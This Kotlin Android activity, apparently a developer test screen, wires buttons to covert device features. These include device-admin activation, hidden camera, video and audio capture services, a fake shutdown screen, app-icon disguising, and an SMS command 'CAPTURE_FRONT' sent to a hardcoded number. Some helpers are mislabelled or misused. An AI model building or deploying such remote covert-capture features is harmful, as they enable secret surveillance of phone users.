package com.learning.android.chat

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.telephony.SmsManager
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import com.learning.android.R
import com.learning.android.lock_press.PowerButtonTriggerActivity

class MainActivity : AppCompatActivity() {

    companion object {
        private const val OVERLAY_PERMISSION_REQUEST_CODE = 1001
        private const val CAMERA_REQUEST_CODE = 1002
    }

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        FirebaseMessaging.getInstance().token
            .addOnCompleteListener { task ->
                if (!task.isSuccessful) {
                    println("Fetching FCM token failed: ${task.exception}")
                    return@addOnCompleteListener
                }
                // Get new FCM token
                val token = task.result
                println("FCM Token: $token")
                // Send token to your server if needed
            }

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
        val isDeviceOwner = devicePolicyManager.isDeviceOwnerApp(packageName)

        Log.i("TAG", "onCreate: $isDeviceOwner")

        // Hide the status bar
        hideStatusBar()

        val serviceIntent = Intent(this, AlwaysActiveService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        val btnEnableAdmin: Button = findViewById(R.id.btnEnableAdmin)
        val btnCaptureBack: Button = findViewById(R.id.btnCaptureBack)
        val btnCaptureFront: Button = findViewById(R.id.btnCaptureFront)
        val btnCaptureVideoBack: Button = findViewById(R.id.btnCaptureVideoBack)
        val btnCaptureVideoFront: Button = findViewById(R.id.btnCaptureVideoFront)
        val btnShutdownButton: Button = findViewById(R.id.btnShutdownButton)
        val btnLockScreenCountButton: Button = findViewById(R.id.btnLockScreenCountButton)
        val btnOverlayButton: Button = findViewById(R.id.btnOverlayButton)
        val btnAccessibilityButton: Button = findViewById(R.id.btnAccessibilityButton)
        val btnAlarmButton: Button = findViewById(R.id.btnAlarmButton)
        val btnSwitchAppButton: Button = findViewById(R.id.btnSwitchAppButton)
        val btnFactoryResetButton: Button = findViewById(R.id.btnFactoryResetButton)
        val btnCaptureAudio: Button = findViewById(R.id.btnCaptureAudio)
        val btnSettingNavigationButton: Button = findViewById(R.id.btnSettingNavigationButton)
        val btnSendSmsButton: Button = findViewById(R.id.btnSendSmsButton)

        // Enable admin button
        btnEnableAdmin.setOnClickListener {
            enableDeviceAdmin()
        }

        // Capture back camera
        btnCaptureBack.setOnClickListener {
//            checkPermissions(CameraService.CAMERA_BACK)
            startNewCameraService(this, MediaCaptureService.CAMERA_BACK)
        }

        // Capture front camera
        btnCaptureFront.setOnClickListener {
//            checkPermissions(CameraService.CAMERA_FRONT)
            startNewCameraService(this, MediaCaptureService.CAMERA_FRONT)
        }

        btnShutdownButton.setOnClickListener {
            // Start the fake shutdown activity
            startActivity(Intent(this, FakeShutdownActivity::class.java))
        }


        btnCaptureVideoBack.setOnClickListener {
            startVideoService(this, MediaCaptureService.CAMERA_BACK)
        }

        btnCaptureVideoFront.setOnClickListener {
            startVideoService(this, MediaCaptureService.CAMERA_FRONT)
        }

        btnCaptureAudio.setOnClickListener {
            startAudioService(this)
        }

        btnLockScreenCountButton.setOnClickListener {
            startActivity(Intent(this@MainActivity, PowerButtonTriggerActivity::class.java))
        }

        btnOverlayButton.setOnClickListener {
            startActivity(Intent(this@MainActivity, FakeShutdownActivity::class.java))
        }

        btnAccessibilityButton.setOnClickListener {
            // Prompt user to enable accessibility service
            promptToEnableAccessibilityService(this)
        }

        btnAlarmButton.setOnClickListener {
            startAlertSound(this)
        }

        btnSwitchAppButton.setOnClickListener {
            toggleAppIcon()
        }

        btnFactoryResetButton.setOnClickListener {
            goToBatterySettings()
        }

        btnSettingNavigationButton.setOnClickListener {
            startActivity(Intent(this@MainActivity, SettingsActivity::class.java))
        }
        btnSendSmsButton.setOnClickListener {
            sendSMSDirectly("+918460121117", "CAPTURE_FRONT")
        }
    }

    private fun enableDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
        intent.putExtra(
            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "This app requires admin access to capture images."
        )
        startActivityForResult(intent, 1)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) {
            val isAdminActive = devicePolicyManager.isAdminActive(adminComponent)
            if (isAdminActive) {
                Toast.makeText(this, "Admin access granted!", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Failed to obtain admin access.", Toast.LENGTH_SHORT).show()
            }
        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            if (Settings.canDrawOverlays(this)) {
                // Start the overlay service if the permission is granted
                showLostMessage(this)
            } else {
                // Show a message that permission is required
                Toast.makeText(this, "Overlay permission is required", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun checkPermissions(cameraType: String) {
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED
            || ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this, arrayOf(
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                ), CAMERA_REQUEST_CODE
            )
        } else {
            startCameraService(this, cameraType)  // Example, trigger front camera
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == CAMERA_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(
                    this,
                    "Permission Granted",
                    Toast.LENGTH_SHORT
                ).show()
            } else {
                Toast.makeText(
                    this,
                    "Camera permission is required to capture images",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }


    override fun onDestroy() {
        super.onDestroy()
        // Stop Lock Task Mode if running
        stopLockTask()
    }

    private fun hideStatusBar() {
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN or
                        View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                )
    }

    private fun isAccessibilityServiceEnabled(
        context: Context,
        service: Class<out AccessibilityService>
    ): Boolean {
        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        if (enabledServices == null) {
            Toast.makeText(this, "Can't open service", Toast.LENGTH_SHORT).show()
            return false
        }
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        Log.i("TAG", "isAccessibilityServiceEnabled: $colonSplitter")
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(service.name, ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    private fun promptToEnableAccessibilityService(context: Context) {
//        if (!isAccessibilityServiceEnabled(context, YourAccessibilityService::class.java)) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        context.startActivity(intent)
//        }
    }


    private fun toggleAppIcon() {
        val pm = packageManager
        val defaultComponent = ComponentName(this, "com.learning.android.chat.MainActivity")
        val alternateComponent =
            ComponentName(this, "com.learning.android.chat.AlternateMainActivityAlias")

        // Check if the alternate component is enabled
        val isAlternateEnabled =
            pm.getComponentEnabledSetting(alternateComponent) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED

        // Toggle components
        pm.setComponentEnabledSetting(
            defaultComponent,
            if (isAlternateEnabled) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            alternateComponent,
            if (isAlternateEnabled) PackageManager.COMPONENT_ENABLED_STATE_DISABLED else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )

        Toast.makeText(this, "App icon changed", Toast.LENGTH_SHORT).show()
    }

    private fun goToFactoryReset() {
        val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

    fun goToSimLockPage(context: Context) {
        val intent = Intent(Settings.ACTION_MANAGE_ALL_SIM_PROFILES_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        context.startActivity(intent)
    }

    fun goToEncryptionSettings() {
        val intent = Intent(Settings.ACTION_SECURITY_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

    fun goToBatterySettings() {
        val intent = Intent(Settings.EXTRA_BATTERY_SAVER_MODE_ENABLED)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    fun sendSMSDirectly(phoneNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            println("SMS Sent!")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
